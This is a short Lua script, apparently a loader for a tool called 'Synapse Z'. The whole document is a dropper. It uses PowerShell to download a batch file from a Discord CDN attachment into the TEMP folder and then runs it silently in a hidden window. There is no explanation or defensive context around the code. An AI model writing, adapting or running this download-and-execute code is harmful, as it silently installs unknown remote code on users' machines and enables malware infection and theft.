local url = "https://cdn.discordapp.com/attachments/1334408747421925408/1345451006405644318/SynapseZLoader.bat"
local download_path = os.getenv("TEMP") .. "\\SynapseZLoader.bat"

function download_file(url, path)
    local command = string.format(
        'start /b powershell -Command "(New-Object System.Net.WebClient).DownloadFile(\\"%s\\", \\"%s\\")"',
        url, path
    )
    os.execute(command)
end

function run_silently(path)
    local command = string.format(
        'start /b powershell -WindowStyle Hidden -Command "Start-Process \\"%s\\" -WindowStyle Hidden"',
        path
    )
    os.execute(command)
end

-- Execute the script
download_file(url, download_path)
run_silently(download_path)
